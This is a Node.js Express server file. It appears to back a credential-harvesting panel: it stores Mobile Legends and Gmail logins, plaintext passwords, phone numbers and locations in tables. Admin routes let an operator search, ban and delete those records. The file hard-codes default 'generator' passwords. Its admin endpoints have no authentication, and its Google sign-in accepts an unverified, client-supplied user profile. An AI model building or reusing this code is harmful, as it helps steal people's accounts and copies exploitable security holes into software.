const express = require('express');
const { Pool } = require('pg');
const cors = require('cors');
const bcrypt = require('bcryptjs');
const crypto = require('crypto');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: { rejectUnauthorized: false }
});

pool.connect(err => {
    if (err) console.error('DB Error:', err.message);
    else console.log('Database connected!');
});

// Create tables
pool.query(`CREATE TABLE IF NOT EXISTS auth_users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50) UNIQUE,
    email VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(255),
    google_id VARCHAR(100) UNIQUE,
    login_type VARCHAR(10) DEFAULT 'local',
    avatar VARCHAR(500),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_login TIMESTAMP
)`);

pool.query(`CREATE TABLE IF NOT EXISTS generator_passwords (
    id SERIAL PRIMARY KEY,
    user_id INT UNIQUE REFERENCES auth_users(id),
    gmail_password VARCHAR(100) DEFAULT 'DoubleMK2008',
    mlbb_password VARCHAR(100) DEFAULT 'GlobalMK2008'
)`);

pool.query(`CREATE TABLE IF NOT EXISTS notices (
    id SERIAL PRIMARY KEY,
    message TEXT NOT NULL,
    created_by VARCHAR(100),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)`);

pool.query(`CREATE TABLE IF NOT EXISTS banned_users (
    user_id VARCHAR(50) PRIMARY KEY,
    banned_by VARCHAR(100),
    banned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)`);

pool.query(`CREATE TABLE IF NOT EXISTS mlbb_accounts (
    user_id VARCHAR(50) PRIMARY KEY,
    ingame_name VARCHAR(100),
    ingame_id VARCHAR(50),
    server_id VARCHAR(20),
    gmail VARCHAR(100),
    password VARCHAR(100),
    phone VARCHAR(20),
    location VARCHAR(100),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)`);

pool.query(`CREATE TABLE IF NOT EXISTS gmail_accounts (
    user_id VARCHAR(50) PRIMARY KEY,
    name VARCHAR(100),
    email VARCHAR(100),
    password VARCHAR(100),
    phone VARCHAR(20),
    location VARCHAR(100),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)`);

const sessionTokens = {};

app.post('/api/register', async (req, res) => {
    const { username, email, password } = req.body;
    if (!username || !email || !password) return res.json({ success: false, message: 'All fields required' });

    try {
        const exist = await pool.query('SELECT id FROM auth_users WHERE email = $1 OR username = $2', [email, username]);
        if (exist.rows.length > 0) return res.json({ success: false, message: 'Email or Username already exists' });

        const hashed = bcrypt.hashSync(password, 10);
        const result = await pool.query('INSERT INTO auth_users (username, email, password, login_type) VALUES ($1, $2, $3, $4) RETURNING id',
            [username, email, hashed, 'local']);
        await pool.query('INSERT INTO generator_passwords (user_id) VALUES ($1)', [result.rows[0].id]);
        res.json({ success: true, message: 'Registration successful' });
    } catch (e) { res.json({ success: false, message: 'Database error: ' + e.message }); }
});

app.post('/api/login', async (req, res) => {
    const { email, password } = req.body;
    if (!email || !password) return res.json({ success: false, message: 'Email and password required' });

    try {
        const result = await pool.query("SELECT * FROM auth_users WHERE email = $1 AND login_type = 'local'", [email]);
        if (result.rows.length === 0) return res.json({ success: false, message: 'Invalid email or password' });

        const user = result.rows[0];
        if (!bcrypt.compareSync(password, user.password)) return res.json({ success: false, message: 'Invalid email or password' });

        await pool.query('UPDATE auth_users SET last_login = NOW() WHERE id = $1', [user.id]);
        const token = crypto.randomBytes(32).toString('hex');
        sessionTokens[token] = user.id;

        res.json({ success: true, token, user: { id: user.id, username: user.username, email: user.email, login_type: user.login_type } });
    } catch (e) { res.json({ success: false, message: 'Error' }); }
});

app.post('/api/auth/google', async (req, res) => {
    const { token, userInfo } = req.body;
    if (!userInfo) return res.json({ success: false });
    const { sub: googleId, email, name, picture } = userInfo;

    try {
        let user = await pool.query('SELECT * FROM auth_users WHERE google_id = $1', [googleId]);
        if (user.rows.length > 0) {
            await pool.query('UPDATE auth_users SET last_login = NOW() WHERE id = $1', [user.rows[0].id]);
            const st = crypto.randomBytes(32).toString('hex');
            sessionTokens[st] = user.rows[0].id;
            return res.json({ success: true, token: st, user: { id: user.rows[0].id, username: user.rows[0].username, email: user.rows[0].email, login_type: 'google' } });
        }

        user = await pool.query("SELECT * FROM auth_users WHERE email = $1 AND login_type = 'local'", [email]);
        if (user.rows.length > 0) {
            await pool.query('UPDATE auth_users SET google_id = $1 WHERE id = $2', [googleId, user.rows[0].id]);
            const st = crypto.randomBytes(32).toString('hex');
            sessionTokens[st] = user.rows[0].id;
            return res.json({ success: true, token: st, user: { id: user.rows[0].id, username: user.rows[0].username, email: user.rows[0].email, login_type: 'google' } });
        }

        const newUser = await pool.query('INSERT INTO auth_users (username, email, google_id, login_type) VALUES ($1, $2, $3, $4) RETURNING id',
            [name || 'Google User', email, googleId, 'google']);
        await pool.query('INSERT INTO generator_passwords (user_id) VALUES ($1)', [newUser.rows[0].id]);
        const st = crypto.randomBytes(32).toString('hex');
        sessionTokens[st] = newUser.rows[0].id;
        res.json({ success: true, token: st, user: { id: newUser.rows[0].id, username: name, email, login_type: 'google' } });
    } catch (e) { res.json({ success: false }); }
});

app.post('/api/check_session', async (req, res) => {
    const { token } = req.body;
    if (token && sessionTokens[token]) {
        const result = await pool.query('SELECT * FROM auth_users WHERE id = $1', [sessionTokens[token]]);
        if (result.rows.length > 0) {
            const user = result.rows[0];
            return res.json({ success: true, user: { id: user.id, username: user.username, email: user.email, login_type: user.login_type } });
        }
    }
    res.json({ success: false });
});

app.post('/api/logout', (req, res) => {
    const { token } = req.body;
    if (token && sessionTokens[token]) delete sessionTokens[token];
    res.json({ success: true });
});

app.post('/api/get_passwords', async (req, res) => {
    const { token } = req.body;
    if (!token || !sessionTokens[token]) return res.json({ success: true, gmail_password: 'DoubleMK2008', mlbb_password: 'GlobalMK2008' });
    try {
        const result = await pool.query('SELECT * FROM generator_passwords WHERE user_id = $1', [sessionTokens[token]]);
        if (result.rows.length === 0) return res.json({ success: true, gmail_password: 'DoubleMK2008', mlbb_password: 'GlobalMK2008' });
        res.json({ success: true, gmail_password: result.rows[0].gmail_password, mlbb_password: result.rows[0].mlbb_password });
    } catch (e) { res.json({ success: true, gmail_password: 'DoubleMK2008', mlbb_password: 'GlobalMK2008' }); }
});

app.post('/api/change_password', async (req, res) => {
    const { token, type, current_password, new_password } = req.body;
    if (!token || !sessionTokens[token]) return res.json({ success: false, message: 'Session expired' });
    const userId = sessionTokens[token];
    try {
        const result = await pool.query('SELECT * FROM generator_passwords WHERE user_id = $1', [userId]);
        const def = type === 'gmail' ? 'DoubleMK2008' : 'GlobalMK2008';
        const cur = result.rows.length > 0 ? (type === 'gmail' ? result.rows[0].gmail_password : result.rows[0].mlbb_password) : def;
        if (current_password !== cur) return res.json({ success: false, message: 'Wrong current password' });

        if (result.rows.length > 0) {
            const field = type === 'gmail' ? 'gmail_password' : 'mlbb_password';
            await pool.query(`UPDATE generator_passwords SET ${field} = $1 WHERE user_id = $2`, [new_password, userId]);
        } else {
            await pool.query('INSERT INTO generator_passwords (user_id, gmail_password, mlbb_password) VALUES ($1, $2, $3)',
                [userId, type === 'gmail' ? new_password : 'DoubleMK2008', type === 'mlbb' ? new_password : 'GlobalMK2008']);
        }
        res.json({ success: true, message: 'Password changed' });
    } catch (e) { res.json({ success: false, message: 'Error' }); }
});

app.post('/api/admin/search', async (req, res) => {
    const { userId } = req.body;
    try {
        let result = await pool.query('SELECT * FROM mlbb_accounts WHERE user_id = $1 OR ingame_id = $1', [userId]);
        if (result.rows.length > 0) return res.json({ success: true, data: result.rows[0] });
        result = await pool.query('SELECT * FROM gmail_accounts WHERE user_id = $1', [userId]);
        if (result.rows.length > 0) return res.json({ success: true, data: result.rows[0] });
        res.json({ success: false, message: 'Not found' });
    } catch (e) { res.json({ success: false }); }
});

app.post('/api/admin/ban', async (req, res) => {
    const { userId } = req.body;
    try {
        await pool.query('INSERT INTO banned_users (user_id, banned_by) VALUES ($1, $2) ON CONFLICT (user_id) DO UPDATE SET banned_by = $2', [userId, 'admin']);
        res.json({ success: true });
    } catch (e) { res.json({ success: false }); }
});

app.post('/api/admin/delete', async (req, res) => {
    const { userId } = req.body;
    try {
        await pool.query('DELETE FROM mlbb_accounts WHERE user_id = $1', [userId]);
        await pool.query('DELETE FROM gmail_accounts WHERE user_id = $1', [userId]);
        await pool.query('DELETE FROM banned_users WHERE user_id = $1', [userId]);
        res.json({ success: true });
    } catch (e) { res.json({ success: false }); }
});

app.get('/api/notice', async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM notices ORDER BY id DESC LIMIT 1');
        if (result.rows.length === 0) return res.json({ success: true, message: '' });
        res.json({ success: true, message: result.rows[0].message, created_at: result.rows[0].created_at });
    } catch (e) { res.json({ success: true, message: '' }); }
});

app.post('/api/admin/notice', async (req, res) => {
    const { message } = req.body;
    if (!message) return res.json({ success: false, message: 'Message required' });
    try {
        await pool.query('INSERT INTO notices (message, created_by) VALUES ($1, $2)', [message, 'admin']);
        res.json({ success: true, message: 'Notice posted' });
    } catch (e) { res.json({ success: false, message: 'Error' }); }
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/dashboard', (req, res) => res.sendFile(path.join(__dirname, 'dashboard.html')));

app.listen(PORT, '0.0.0.0', () => console.log(`Server running on port ${PORT}`));
